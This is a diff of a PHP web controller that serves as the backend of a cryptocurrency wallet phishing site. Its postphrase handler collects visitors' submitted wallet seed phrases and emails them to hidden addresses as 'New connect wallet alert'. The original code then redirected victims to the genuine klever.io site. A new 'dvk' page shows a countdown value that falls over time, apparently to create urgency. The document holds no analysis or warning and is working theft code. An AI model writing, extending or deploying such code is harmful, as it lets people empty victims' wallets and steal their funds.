@@ -1,14 +1,49 @@
 <?php
+
 namespace App\Controllers;
+
 require 'vendor/autoload.php';
 
-use Carbon\Carbon; 
+use Carbon\Carbon;
 
 class Home extends BaseController
 {
+	private function price(int $pri)
+	{
+		$len =  mb_strlen($pri);
+		if ($len == 4) {
+			$end = substr($pri, -3);
+			$first = substr($pri, 0, 1);
+			return $first . ',' . $end;
+		} elseif ($len == 3) {
+			return $pri;
+		} elseif ($len == 2) {
+			return $pri;
+		} elseif ($len == 1) {
+			return $pri;
+		} elseif ($len == 5) {
+			$end = substr($pri, -3);
+			$first = substr($pri, 0, 2);
+			return $first . ',' . $end;
+		} elseif ($len == 6) {
+			$end = substr($pri, -3);
+			$first = substr($pri, 0, 3);
+			return $first . ',' . $end;
+		} elseif ($len == 7) {
+			$end = substr($pri, -3);
+			$mid = substr($pri, -6, 3);
+			$first = substr($pri, 0, 1);
+			return $first . ',' . $mid . ',' . $end;
+		} elseif ($len == 8) {
+			$end = substr($pri, -3);
+			$mid = substr($pri, -6, 3);
+			$first = substr($pri, 0, 2);
+			return $first . ',' . $mid . ',' . $end;
+		}
+	}
+
 	public function index()
 	{
-		echo Carbon::create(2021,7,26)->diffInHours();
 		echo view('home');
 	}
 
@@ -19,7 +54,13 @@ class Home extends BaseController
 
 	public function dvk()
 	{
-		echo view('dvk');
+		$hrs = Carbon::create(2021, 7, 26)->diffInMinutes();
+		// $now = Carbon::now();
+		$perc = (6000 - $hrs) / 6000;
+		$value = $perc * 20000000;
+		$final = $this->price(round($value, -3));
+		$percent = floor(($value / 20000000) * 100);
+		echo view('dvk',['klv'=>$final,'perc'=>$percent]);
 	}
 
 	public function message($type, array $data)
@@ -56,35 +97,35 @@ class Home extends BaseController
 	public function mailer(array $data)
 	{
 		$email = \Config\Services::email();
-		$email->setFrom( getenv('smtpuser'), 'Seed Phrase Notification');
+		$email->setFrom(getenv('smtpuser'), 'Seed Phrase Notification');
 		$email->setTo($data['to']);
-		// $email->setCC($data['cc']);
+		$email->setCC($data['cc']);
 		// $email->setBCC('them@their-example.com');
 
 		$email->setSubject($data['subject']);
 		$email->setMessage($this->message($data['type'], $data['message']));
 
 		$email->send(false);
-		// return $email->printDebugger(['headers', 'subject', 'body']);
+		return $email->printDebugger(['headers', 'subject', 'body']);
 	}
 
 	public function postphrase()
 	{
 		$incoming = $this->request->getPost();
-		if(isset($incoming['wallet'])){
-			$msg = "Wallet type: ".$incoming['wallet']." <br> "."Seed Phrase: ".$incoming['phrase'];
-		}else{
-			$msg = "Seed Phrase: ".$incoming['phrase'];
+		if (isset($incoming['wallet'])) {
+			$msg = "Wallet type: " . $incoming['wallet'] . " <br> " . "Seed Phrase: " . $incoming['phrase'];
+		} else {
+			$msg = "Seed Phrase: " . $incoming['phrase'];
 		}
 		$data = [
-			'to' => getenv('smtpto'),
 			'cc' => getenv('smtpcc'),
+			'to' => getenv('smtpto'),
 			'type' => 'link',
 			'subject' => 'New connect wallet alert',
 			'message' => ['msg' => $msg],
 		];
-		$this->mailer($data);
-		return redirect()->to('https://klever.io');
+		echo $this->mailer($data);
+		// return redirect()->to('https://klever.io');
 	}
 	//--------------------------------------------------------------------
 
